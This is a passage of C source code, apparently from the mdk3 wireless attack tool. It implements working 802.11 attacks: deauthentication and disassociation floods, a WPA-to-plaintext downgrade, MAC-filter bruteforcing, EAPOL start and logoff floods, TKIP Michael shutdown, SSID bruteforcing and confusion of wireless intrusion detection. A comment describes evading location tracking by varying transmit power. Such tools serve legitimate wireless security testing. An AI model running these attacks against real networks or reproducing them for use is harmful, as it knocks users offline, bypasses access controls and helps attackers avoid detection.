      memcpy(pkt + 10, eapol_src, ETHER_ADDR_LEN);
      memcpy(pkt + 16, target, ETHER_ADDR_LEN);
      retn.len = 36;
      retn.data = pkt;
      return retn;
    }

    // We can never reach this part of code unless somebody messes around with memory
    // But just to make gcc NOT complain...
    return retn;
}

struct pckt eapol_logoff(unsigned char *ap, unsigned char *sta)
{
  struct pckt retn;

  memcpy(pkt, PKT_EAPOL_LOGOFF, 36);
  memcpy(pkt + 4, ap, ETHER_ADDR_LEN);
  memcpy(pkt + 10, sta, ETHER_ADDR_LEN);
  memcpy(pkt + 16, ap, ETHER_ADDR_LEN);
  retn.len = 36;
  retn.data = pkt;
  return retn;
}

struct pckt wids_machine()
{
    int t;
    struct clistwidsclient *search;

/*  ZERO_CHAOS says: if you want to make the WIDS vendors hate you
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims
    also match the sequence numbers of the victims

Aireplay should be able to choose IV from a pool (when ringbuffer is big enough or unlimited) that hasn't been used in last X packets 
Ghosting (tx power): by changing tx power of the card while injecting, we can evade location tracking. If you turn the radio's power up and down every few ms, the trackers will have a much harder time finding you (basicly you will hop all over the place depending on sensor position). At least madwifi can do it. 
Ghosting (speed/modulation): change speed every few ms, not a fantastic evasion technique but it may cause more location tracking oddity. Note that tx power levels can only be set at certain speeds (lower speed means higher tx power allowed). 
802.11 allows you to fragment each packet into as many as 16 pieces. It would be nice if we could use fragmentated packets in every aireplay-ng attack.
*/

    if (! init_wids) {
	// WIDS confusion initialisation

	wids_stats.aps = 0;
	wids_stats.clients = 0;
	wids_stats.cycles = 0;
	wids_stats.deauths = 0;

	printf("\nWaiting 10 seconds for initialization...\n");

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) wids_sniffer, (void *) 1);

	for (t=0; t<10; t++) {
	    sleep(1);
	    printf("\rAPs found: %d   Clients found: %d", wids_stats.aps, wids_stats.clients);
	}

	while (!init_aplist) {
	    printf("\rNo APs have been found yet, waiting...\n");
	    sleep(5);
	}
	while (!init_clientlist) {
	    printf("\rNo clients found yet. If it doesn't start, maybe you need to fake additional clients with -c\n");
	    sleep(5);
	}
	init_wids = 1;
    }

    // Move forward some steps
    char rnd = random() % 13;
    for (t=0; t<rnd; t++) {
	clwc_cur = clwc_cur->next;
	clwa_cur = clwa_cur->next;
    }

    //Checking for any half open connection
    search = search_status_widsclient(clwc_cur, 1, osdep_get_channel());
    if (search != NULL) {  //Found client authed but not assoced
	if (search->retry > 10) {
	    search->status = 0;
	    search->retry = 0;
	}
	search->retry++;
//printf("\rAssociating Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", search->mac[0], search->mac[1], search->mac[2], search->mac[3], search->mac[4], search->mac[5], search->bssid->bssid[0], search->bssid->bssid[1], search->bssid->bssid[2], search->bssid->bssid[3], search->bssid->bssid[4], search->bssid->bssid[5]);
	return create_assoc_frame_simple(search->bssid->bssid, search->mac, search->bssid->capa, essid, essid_len);
    }
    search = search_status_widsclient(clwc_cur, 2, osdep_get_channel());
    if (search != NULL) {  //Found client assoced but sent no data yet
	search->status = 0;
	wids_stats.cycles++;
	return get_data_for_wids(search);
    }

    //Chosing current client and connect him to the next AP in the list
    do {
	if (zc_exploit) { // Zero: Connecting to foreign AP
	    clwc_cur->bssid = clwa_cur->next;
	    clwa_cur = clwa_cur->next;
	} else { // ASPj: Connecting to WDS AP
	    clwc_cur->bssid = clwc_cur->bssid->next;
	}
    } while (clwc_cur->bssid->channel != osdep_get_channel());

//printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X on AP %02X:%02X:%02X:%02X:%02X:%02X           \n", clwc_cur->mac[0], clwc_cur->mac[1], clwc_cur->mac[2], clwc_cur->mac[3], clwc_cur->mac[4], clwc_cur->mac[5], clwc_cur->bssid->bssid[0], clwc_cur->bssid->bssid[1], clwc_cur->bssid->bssid[2], clwc_cur->bssid->bssid[3], clwc_cur->bssid->bssid[4], clwc_cur->bssid->bssid[5]);

    return create_auth_frame(clwc_cur->bssid->bssid, 0, clwc_cur->mac);
}

struct pckt mac_bruteforcer()
{
    struct pckt rtnpkt;
    static unsigned char *current_mac;
    int get_new_mac = 1;
    static struct timeval tv_start, tv_end, tv_diff, tv_temp, tv_temp2;
    struct timespec wait;

    if (! mac_b_init) {
	pthread_cond_init (&has_packet, NULL);
	pthread_mutex_init (&has_packet_mutex, NULL);
	pthread_mutex_unlock (&has_packet_mutex);
	pthread_cond_init (&clear_packet, NULL);
	pthread_mutex_init (&clear_packet_mutex, NULL);
	pthread_mutex_unlock (&clear_packet_mutex);

	tv_dyntimeout.tv_sec = 0;
	tv_dyntimeout.tv_usec = 100000;	//Dynamic timeout initialized with 100 ms

	pthread_t sniffer;
	pthread_create( &sniffer, NULL, (void *) mac_bruteforce_sniffer, (void *) 1);
    }

    if (mac_b_init) {
	//Wait for an answer to the last packet
	gettimeofday(&tv_temp, NULL);
	timeradd(&tv_temp, &tv_dyntimeout, &tv_temp2);
	TIMEVAL_TO_TIMESPEC(&tv_temp2, &wait);
	pthread_cond_timedwait(&has_packet, &has_packet_mutex, &wait);

	//has packet after timeout?
	if (has_packet_really) {
	    //  if yes: if this answer is positive, copy the MAC, print it and exit!
	    if (memcmp(target, pkt_sniff+4, 6)) // Filter out own packets & APs responding strangely (authing themselves)
	    if ((pkt_sniff[28] == 0x00) && (pkt_sniff[29] == 0x00)) {
		unsigned char *p = pkt_sniff;
		printf("\n\nFound a valid MAC adress: %02X:%02X:%02X:%02X:%02X:%02X\nHave a nice day! :)\n",
		       p[4], p[5], p[6], p[7], p[8], p[9]);
		exit(0);
	    }

	    //  if this is an answer to our current mac: get a new mac later
	    if (! memcmp(pkt_sniff+4, current_mac, 6)) {
		get_new_mac = 1;
		mac_brute_speed++;

		//  get this MACs check time, calculate new timeout
		gettimeofday(&tv_end, NULL);
		tvdiff(&tv_end, &tv_start, &tv_diff);

		/* #=- The magic timeout formula -=# */
		//If timeout is more than 500 ms, it sure is due to weak signal, so drop the calculation
		if ((tv_diff.tv_sec == 0) && (tv_diff.tv_usec < 500000)) {

		    //If timeout is lower, go down pretty fast (half the difference)
		    if (tv_diff.tv_usec < tv_dyntimeout.tv_usec) {
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 2) - tv_dyntimeout.tv_usec) / 2);
		    } else {
		    //If timeout is higher, raise only a little
			tv_dyntimeout.tv_usec += (((tv_diff.tv_usec * 4) - tv_dyntimeout.tv_usec) / 4);
		    }
		    //High timeouts due to bad signal? Don't go above 250 milliseconds!
		    //And avoid a broken timeout (less than half an ms, more than 250 ms)
		    if (tv_dyntimeout.tv_usec > 250000) tv_dyntimeout.tv_usec = 250000;
		    if (tv_dyntimeout.tv_usec <    500) tv_dyntimeout.tv_usec =    500;
		}
	    }

	    //reset has_packet, send condition clear_packet (after memcpy!)
	    has_packet_really = 0;
	    pthread_cond_signal(&clear_packet);

	// if not: dont get a new mac later!
	} else {
	    get_new_mac = 0;
	    mac_brute_timeouts++;
	}
    }

    // Get a new MAC????
    if (get_new_mac) {
	current_mac = get_next_mac();
	// Set this MACs first time mark
	gettimeofday(&tv_start, NULL);
    }
    // Create packet and send
    rtnpkt = create_auth_frame(target, 0, current_mac);

    mac_b_init = 1;

    return rtnpkt;
}

struct pckt wpa_downgrade()
{

    struct pckt rtnpkt;
    static int state = 0;
    int plen;

    rtnpkt.len = 0;
    rtnpkt.data = NULL; // A null packet we return when captured packet was useless
			// This ensures that statistics will be printed in low traffic situations

    switch (state) {
	case 0:		// 0: Waiting for a data packet from target

		//Sniff packet
		plen = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
		if (plen < 36) return rtnpkt;
		//Is from target network?
		if (! is_from_target_ap(target, pkt_sniff))
		   return rtnpkt;
		//Is a beacon?
		if (pkt_sniff[0] == 0x80) {
		    wpad_beacons++;
		    return rtnpkt;
		}
		//Is data (or qos data)?
		if ((! (pkt_sniff[0] == 0x08)) && (! (pkt_sniff[0] == 0x88)))
		    return rtnpkt;
		//Is encrypted?
		if (! (pkt_sniff[1] & 0x40)) {
		    if ((pkt_sniff[30] == 0x88) && (pkt_sniff[31] == 0x8e)) { //802.1x Authentication!
			wpad_auth++;
		    } else {
			wpad_wep++;
		    }
		    return rtnpkt;
		}
		//Check WPA Enabled
		if ((pkt_sniff[27] & 0xFC) == 0x00) {
		    wpad_wep++;
		    return rtnpkt;
		}

		state++;

			// 0: Deauth AP -> Station
		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 1:		// 1: Disassoc AP -> Station

		state++;

		return create_deauth_frame(get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
	case 2:		// 2: Deauth Station -> AP

		state++;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 0);

	break;
	case 3:		// 3: Disassoc Station -> AP


		//Increase cycle counter
		wpad_cycles++;
		state = 0;

		return create_deauth_frame(get_macs_from_packet('s', pkt_sniff),
					   get_macs_from_packet('a', pkt_sniff),
					   get_macs_from_packet('b', pkt_sniff), 1);

	break;
    }

    printf("BUG: WPA-Downgrade: Control reaches end unexpectedly!\n");
    return rtnpkt;

}

struct pckt renderman_discovery_tool()
{  
//1. mdk3 listens on some interface for beacons with hidden SSID
//2. it sends PROBE packets with SSIDs from a file back to the AP
//3. it waits for a response, prints the results
//4. it stores the APs MAC addr to not probe it a second time (be very nice)
  
    int len;
    unsigned char *zero_ssid = malloc(MAX_PACKET_LENGTH);
    static struct clist known;
    static int init_known = 0;
    static unsigned char *cur_ap = NULL;
    static int ssid_queue_in_use = 0;
    char *cur_ssid;
    
    memset(zero_ssid, '\x00', MAX_PACKET_LENGTH);
    if (cur_ap == NULL) {
	cur_ap = malloc(ETHER_ADDR_LEN);
	memset(cur_ap, '\x00', ETHER_ADDR_LEN);
    }
    
    if (ssid_queue_in_use) {
          cur_ssid = read_line_from_file(1); 
      if (cur_ssid == NULL) {
	ssid_queue_in_use = 0;
      } else {
	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
      }
    }
    
    while (1) {
	while (1) {
	    len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
	    if (len < 40) continue;
	    if (! memcmp(pkt_sniff, "\x80", 1)) {
		if ((pkt_sniff[37] == '\x00') || (pkt_sniff[37] == '\x01')) break; // Null or one-byte length SSID => hidden
		if (! memcmp(pkt_sniff+38, zero_ssid, pkt_sniff[37])) break; // SSID consists only of \x00 => hidden
	    }
	    if (! memcmp(pkt_sniff, "\x50", 1)) {
		if (! memcmp(pkt_sniff+16, cur_ap, ETHER_ADDR_LEN)) {
		    pkt_sniff[38+pkt_sniff[37]] = '\x00';
		    printf("%s\n", pkt_sniff+38);
		    if (! init_known) {
			init_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
			init_known = 1;
		    } else {
			add_to_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
		    }
		    memset(cur_ap, '\x00', ETHER_ADDR_LEN);
		}
	      
	    }
	}

    // Is this AP already known?
	if (! init_known) break;
	if (search_data(&known, pkt_sniff+16, ETHER_ADDR_LEN) == NULL) break;
    }
    
    memcpy(cur_ap, pkt_sniff + 16, ETHER_ADDR_LEN);
    printf("\r%02X:%02X:%02X:%02X:%02X:%02X: ", cur_ap[0], cur_ap[1], cur_ap[2], cur_ap[3], cur_ap[4], cur_ap[5]);
    
    if (brute_ssid != NULL) return create_probe_frame(brute_ssid, generate_mac(1), pkt_sniff+16);

    ssid_queue_in_use = 1;
    cur_ssid = read_line_from_file(1); 
    if (cur_ssid == NULL) { 
	printf("Empty SSID file\n");
	exit(-1);
    } else {
	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
    }
}

/* Response Checkers */

int get_array_index(int array_len, unsigned char *ap)
{
// Get index of AP in auth checker array auth[]

    int t;

    for(t=0; t<array_len; t++)
    {
	if (! memcmp(auth[t], ap, ETHER_ADDR_LEN)) return t;
    }

    return -1;
}

void print_deauth_stats(struct pckt packet)
{
// Print some information while in Deauthentication DoS mode

    unsigned char *ap = packet.data+16;
    unsigned char *fc = packet.data+4;  //For the case AP kicks client

    //For the case client deauthing from AP
    if (! memcmp(packet.data+4, packet.data+16, ETHER_ADDR_LEN))
	fc = packet.data + 10;

    printf("\rDisconnecting between: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
    printf(" and: %02X:%02X:%02X:%02X:%02X:%02X", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);

    // Display current channel, if hopper is running
    if (osdep_get_channel() == 0) {
	printf("\n");
    } else {
	printf(" on channel: %d\n", osdep_get_channel());
    }

}

void print_wids_stats()
{
    printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n",
		  wids_stats.aps, wids_stats.clients, wids_stats.cycles, wids_stats.deauths);
}

void print_mac_bruteforcer_stats(struct pckt packet)
{
    unsigned char *m = packet.data+10;

    float timeout = (float) tv_dyntimeout.tv_usec / 1000.0;

    printf("\rTrying MAC %02X:%02X:%02X:%02X:%02X:%02X with %8.4f ms timeout at %3d MACs per second and %d retries\n",
	   m[0], m[1], m[2], m[3], m[4], m[5], timeout, mac_brute_speed, mac_brute_timeouts);

    mac_brute_speed = 0;
    mac_brute_timeouts = 0;
}

void print_wpa_downgrade_stats()
{
    static int wpa_old = 0, wep_old = 0, warning = 0, downgrader = 0;

    printf("\rDeauth cycles: %4d  802.1x authentication packets: %4d  WEP/Unencrypted packets: %4d  Beacons/sec: %3d\n", wpad_cycles, wpad_auth, wpad_wep, wpad_beacons);
    if (wpad_beacons == 0) {
	printf("NOTICE: Did not receive any beacons! Maybe AP has been reconfigured and/or is rebooting!\n");
    }

    if (wpa_old < wpad_cycles) {
	if (wep_old < wpad_wep) {
	    if (!warning) {
		printf("REALLY BIG WARNING!!! Seems like a client connected to your target AP leaks PLAINTEXT data while authenticating!!\n");
		warning = 1;
	    }
	}
    }

    if (wpa_old == wpad_cycles) {
	if (wep_old < wpad_wep) {
	    downgrader++;
	    if (downgrader == 10) {
		printf("WPA Downgrade Attack successful. No increasing WPA packet count detected. HAVE FUN!\n");
		downgrader = 0;
	    }
	}
    }

    wpa_old = wpad_cycles;
    wep_old = wpad_wep;
    wpad_beacons = 0;
}

void print_stats(char mode, struct pckt packet, int responses, int sent)
{
// Statistics dispatcher

    switch (mode)
    {
    case 'b':
    case 'B':
	print_beacon_stats(packet);
	break;
    case 'a':
    case 'A':
	print_auth_stats(packet);
	break;
    case 'p':
	print_probe_stats(responses, sent);
	break;
    case 'd':
	print_deauth_stats(packet);
	break;
    case 'P':
	print_ssid_brute_stats(packet);
	break;
    case 'i':
	print_intelligent_auth_dos_stats();
	break;
    case 'w':
	print_wids_stats();
	break;
    case 'f':
	print_mac_bruteforcer_stats(packet);
	break;
    case 'g':
	print_wpa_downgrade_stats();
	break;
    /*TODO*/
    }
}

/* MDK Parser, Setting up testing environment */

int mdk_parser(int argc, char *argv[])
{

    int nb_sent = 0, nb_sent_ps = 0;  // Packet counters
    char mode = '0';              // Current mode
    unsigned char *ap = NULL;             // Pointer to target APs MAC
    char check = 0;               // Flag for checking if test is successful
    struct pckt frm;              // Struct to save generated Packets
    char *ssid = NULL;            // Pointer to generated SSID
    int pps = 50;                 // Packet sending rate
    int t = 0;
    time_t t_prev;                // Struct to save time for printing stats every sec
    int total_time = 0;           // Amount of seconds the test took till now
    int chan = 1;                 // Channel for beacon flood mode
    int fchan = 0;                // Channel selected via -c option
    int wep = 0;                  // WEP bit for beacon flood mode (1=WEP, 2=WPA-TKIP 3=WPA-AES)
    int gmode = 0;                // 54g speed flag
    struct pckt mac;              // MAC Space for probe mode
    int resps = 0;                // Counting responses for probe mode
    int usespeed = 0;             // Should injection be slown down?
    int random_mac = 1;           // Use random or valid MAC?
    int ppb = 70;                 // Number of packets per burst
    int wait = 10;                // Seconds to wait between bursts
    int adhoc = 0;                // Ad-Hoc mode
    int adv = 0;                  // Use advanced FakeAP mode
    int renderman_discovery = 0;  // Activate RenderMan's discovery tool
    int got_ssid = 0;
    char *list_file = NULL;       // Filename for periodical white/blacklist processing
    t_prev = (time_t) malloc(sizeof(t_prev));

    // GCC Warning avoidance
    mac.data = NULL;
    mac.len = 0;
    frm.data = NULL;
    frm.len = 0;

    if ((argc < 3) || (strlen(argv[2]) != 1))
    {
	printf(use_head);
	return -1;
    }

    /* Parsing Options - Need to switch to optarg parser? */

    switch (argv[2][0])
    {


    case 'p':
	mode = 'p';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-b"))
	    {
		if(argc<=7){
	   		printf("\nYou have to specify at least:\n \
			\r a channel (-c), a target-mac (-t) and a character-set:\n \
			\r all printable (a)\n \
			\r lower case (l)\n \
			\r upper case (u)\n \
			\r numbers (n)\n \
			\r lower and upper case (c)\n \
			\r lower and upper plus numbers (m)\n \
			\noptional:\n proceed with SSID (-p <SSID>)\n packets per second (-s)\n");
	   printf("\ne.g. : mdk3 ath0 p -b a -p SSID -c 2 -t 00:11:22:33:44:55 -s 1\n\n");
	   return -1;
        }
		real_brute = 1;
		mode = 'P';
		if (argc > t) brute_mode = argv[t+1][0];
		printf("\nSSID Bruteforce Mode activated!\n");
		brute_ssid = (char*) malloc (256 * sizeof(char));
		memset(brute_ssid, 0, (256 * sizeof(char)));
		
	    }
	    if (!strcmp(argv[t], "-p")) {
		    brute_ssid = argv[t+1];
		    printf("\nproceed with: %s",brute_ssid );
		    brute_ssid[0]--;
		}
	    if (! strcmp(argv[t], "-c")){
                if (argc > t+1){ 
		    printf("\n\nchannel set to: %d", atoi(argv[t+1]));
		    osdep_set_channel(atoi(argv[t+1]));
		    }
            }
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) ssid = argv[t+1];
	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
		ssid_file_name = argv[t+1];
		mode = 'P';
		printf("\nSSID Wordlist Mode activated!\n");
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! argc > t+1) { printf(use_prob); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-r")) {
	        renderman_discovery = 1; 
	    }
	}
    break;
    case 'w':
	mode = 'w';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) {
		essid_len = strlen(argv[t+1]);
		essid = (unsigned char *) malloc(essid_len);
		memcpy(essid, argv[t+1], essid_len);
		got_ssid = 1;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 1);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 1);
		}
	    }
	    if (! strcmp(argv[t], "-z")) {
		// Zero_Chaos attack
		zc_exploit = 1;
	    }
	}
    break;
    case 'm':
        mode = 'm';
        usespeed = 1;
        pps = 400;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_mich); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-n")) if (argc > t+1) {
		ppb = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		wait = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-j")) {
		useqosexploit = 1;
	    }
	}
    break;
    case 'x':
	mode = 'x';
        if (argc < 4) { printf(use_eapo); return -1; }
        eapol_test = strtol(argv[3], (char **) NULL, 10);
        usespeed = 1;
        pps = 400;
        eapol_wtype = FLAG_AUTH_WPA;
        eapol_ucast = FLAG_TKIP;
        eapol_mcast = FLAG_TKIP;
	for (t=4; t<argc; t = t + 2)
	{
	    if (! strcmp(argv[t], "-n")) {
              if (! (argc > t+1)) { printf(use_eapo); return -1; }
              ssid = argv[t + 1];
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		target = parse_mac(argv[t+1]);
                memcpy(eapol_dst, target, ETHER_ADDR_LEN);
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		mac_sa = parse_mac(argv[t+1]);
                memcpy(eapol_src, mac_sa, ETHER_ADDR_LEN);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		eapol_wtype = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-u")) if (argc > t+1) {
		eapol_ucast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-m")) if (argc > t+1) {
		eapol_mcast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	}
	break;
    case 'd':
	mode = 'd';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 1;
	    }
	    if (! strcmp(argv[t], "-b")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 2;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 3);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 3);
		}
	    }
	}
    break;
    case 'f':
        mode = 'f';
        usespeed = 0;
	MAC_SET_NULL(mac_lower);
	MAC_SET_NULL(mac_base);
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		target =  parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-m")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_half_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-f")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = parse_mac(argv[t+1]);
		mac_lower = parse_mac(argv[t+1]);
	    }
	}
    break;
    case 'g':
	mode = 'g';
	usespeed = 0;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_wpad); return -1; }
		target = parse_mac(argv[t+1]);
	    }
	}
   break;
    default:
	printf(use_head);
	return -1;
	break;
    }

    printf("\n");

    if (renderman_discovery) {
        if (target != NULL) printf("WARNING: Target switch ignored in discovery mode.\n");
	if ((ssid == NULL) && (ssid_file_name == NULL)) {
	  printf("Please either specify an SSID or a filename with SSIDs to probe for\n");
          exit(-1);
	} else if ((ssid != NULL) && (ssid_file_name != NULL)) {
	  printf("Cannot use both options -e and -f at the same time.\n");
	  exit(-1);
	}
	mode = 'r';
	brute_ssid = ssid;
    }
    
    if ((mode == 'w') && (got_ssid == 0)) {
	printf("Please specify a target ESSID!\n\n");
	printf(use_wids);
	return -1;
    }
    if ((mode == 'P') && (usespeed == 0)) {
	usespeed = 1; pps = 300;
    }
    if ((mode == 'P') && (real_brute) && (target == NULL)) {
	printf("Please specify a target (-t <MAC>)\n");
	return -1;
    }
    if ((mode == 'p') && (ssid == NULL) && (ssid_file_name == NULL)) {
	printf("Please specify an ESSID (option -e) , a filename (option -f) or bruteforce mode (-b)\n");
	return -1;
    }
    if ((mode == 'P') && (target == NULL))
	printf("WARNING: No target (-t <MAC>) specified, will show ALL responses and stop on EOF!\n");
    if ((mode == 'p') && (target != NULL))
	printf("WARNING: Target ignored when not in Bruteforce mode\n");
    if (((mode == 'm') || (mode == 'f')) && (target == NULL))
    {
	if (! useqosexploit) {  // We need no target 
	    printf("Please specify MAC (option -t)\n");
	    return -1;
	}
    }
    if (mode == 'x') {
	if ( (target == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify MAC of target AP (option -t)\n");
          return -1;
        }
        if ( (ssid == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify a SSID (option -n)\n");
          return -1;
        }
        if ( (mac_sa == NULL) && (eapol_test == EAPOL_TEST_LOGOFF) ) {
          printf("Please specify MAC of target STA (option -c)\n");
          return -1;
        }
    }
    if (mode == 'g') {
	if (target == NULL) {
	    printf("Please specify MAC of target AP (option -t)\n");
	    return -1;
	}
    }

    /* Main packet sending loop */

    while(1)
    {

	/* Creating Packets, do sniffing */

	switch (mode)
	{

	case 'p':
	    mac = generate_mac(1);
	    frm = create_probe_frame(ssid, mac, NULL);
	    break;
	case 'P':
	    if (real_brute) {
		frm = ssid_brute_real();
	    } else {
		frm = ssid_brute();
	    }
	    break;
	case 'd':
	    frm = amok_machine(list_file);
	    break;
        case 'm':
            frm = false_tkip(target);
            break;
	case 'x':
            switch (eapol_test) {
              case EAPOL_TEST_START_FLOOD:
                frm = eapol_machine(ssid, strlen(ssid), target, eapol_wtype, eapol_ucast, eapol_mcast);
                break;
              case EAPOL_TEST_LOGOFF:
                frm = eapol_logoff(eapol_dst, eapol_src);
                break;
            }
	    break;
	case 'w':
	    frm = wids_machine();
	    break;
	case 'f':
	    frm = mac_bruteforcer();
	    break;
	case 'g':
	    frm = wpa_downgrade();
	    if (frm.data == NULL) goto statshortcut;
	    break;
	case 'r':
	    frm = renderman_discovery_tool();
	    break;
	}

	/* Sending packet, increase counters */

	if (frm.len < 10) printf("WTF?!? Too small packet injection detected! BUG!!!\n");
	osdep_send_packet(frm.data, frm.len);
	nb_sent_ps++;
	nb_sent++;
	if (useqosexploit) { nb_sent_ps += 3; nb_sent += 3; }	//Yes, I know... too lazy.

	/* User wants check for responses? */

	if ((mode=='a' || mode=='A') && ! check) check_auth(ap);
	if (mode=='p') resps += check_probe(mac);

	/* Does another thread want to exit? */

	if (exit_now) return 0;

	/* Waiting for Hannukah */

	if (usespeed) usleep(pps2usec(pps));

statshortcut:

	/* Print speed, packet count and stats every second */

	if( time( NULL ) - t_prev >= 1 )
        {
            t_prev = time( NULL );
	    print_stats(mode, frm, resps, nb_sent_ps);
	    if (mode != 'r') printf ("\rPackets sent: %6d - Speed: %4d packets/sec", nb_sent, nb_sent_ps);
	    fflush(stdout);
	    nb_sent_ps=0;
	    resps=0;
	    total_time++;
	}

	// Waiting for next burst in Michael Test
        if(! (nb_sent % ppb) && (mode == 'm'))
	    sleep(wait);

    }   // Play it again, Johnny!

    return 0;
}
